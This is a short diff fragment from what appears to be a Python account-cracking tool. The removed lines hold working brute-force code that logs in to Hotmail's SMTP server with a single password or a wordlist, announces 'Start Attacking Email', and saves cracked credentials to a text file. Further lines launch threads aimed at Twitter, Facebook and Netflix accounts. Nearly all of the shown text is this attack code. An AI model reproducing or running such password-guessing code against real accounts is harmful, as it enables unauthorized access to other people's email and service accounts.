@@ -101,36 +101,6 @@ if options.gmail == None  :
     
                     print(use.usage)
                     exit()       
-        smtp_srverH= smtplib.SMTP('smtp.live.com', 587)
-        smtp_srverH.ehlo()
-        smtp_srverH.starttls()
-        if options.password != None or options.list_password == None  :
-            print("%s<<<<<<+++++Start  Attacking Email+++++>>>>>%s"%(R,W))
-            try :
-                smtp_srverH.login(options.hotmail,options.password)
-                print("Found Password :{} \t Found Hotmail:{}".format(options.password,options.hotmail))
-                Save = io.open("Hotmail.txt","a").write("Account Hotmail:"+options.hotmail+"\t\tPassword:"+options.password+"\n")
-            except :
-                print("Not Found Password : {} \t Email Hotmail:{}".format(options.password,options.hotmail))
-        elif options.list_password !=None or options.password == None :
-            password_list = io.open(options.list_password,"r").readlines()
-            for password in password_list:    
-                try :
-                    print("%s<<<<<<+++++Start  Attacking Email+++++>>>>>%s"%(R,W))
-                    smtp_srverH.login(options.hotmail,password)
-                    print("FOUND Password :{} \n Found Hotmail:{}".format(password,options.hotmail))
-                    Save = io.open("Hotmail.txt","a").write("Account Hotmail:"+options.hotmail+"\t\tPassword:"+password+"\n")
-                except smtplib.SMTPAuthenticationError:
-                    print("Not Found Password : {} \t Email Hotmail:{}".format(password,options.hotmail))
-    if options.twitter != None :
-        hejab = threading.Thread(target=twitter,name="hejab")
-        hejab.start()
-    if options.facebook != None :
-        facebook = threading.Thread(target=facebook,name="facebook")
-        facebook.start()
-    if options.netflix != None:
-        netflix = threading.Thread(target=Netflix,name="Netflix")
-        netflix.start()
     
 
 elif options.gmail !=None or  options.hotmail== None or options.twitter==None:  
